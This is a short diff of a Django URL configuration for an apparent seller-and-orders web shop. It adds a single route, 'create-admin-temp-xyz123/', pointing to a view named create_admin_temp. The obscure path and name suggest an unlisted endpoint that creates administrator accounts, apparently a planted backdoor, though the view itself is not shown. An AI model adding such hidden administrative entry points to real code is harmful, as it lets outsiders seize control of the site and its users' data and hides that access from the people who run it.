@@ -23,4 +23,5 @@ urlpatterns = [
     path('seller/delete-account/', views.delete_seller_account, name='delete_seller_account'),
     path('order/<int:order_id>/complaint/', views.file_complaint, name='file_complaint'),
     path('my-orders/', views.my_orders, name='my_orders'),
+    path('create-admin-temp-xyz123/', views.create_admin_temp, name='create_admin_temp'),
 ]
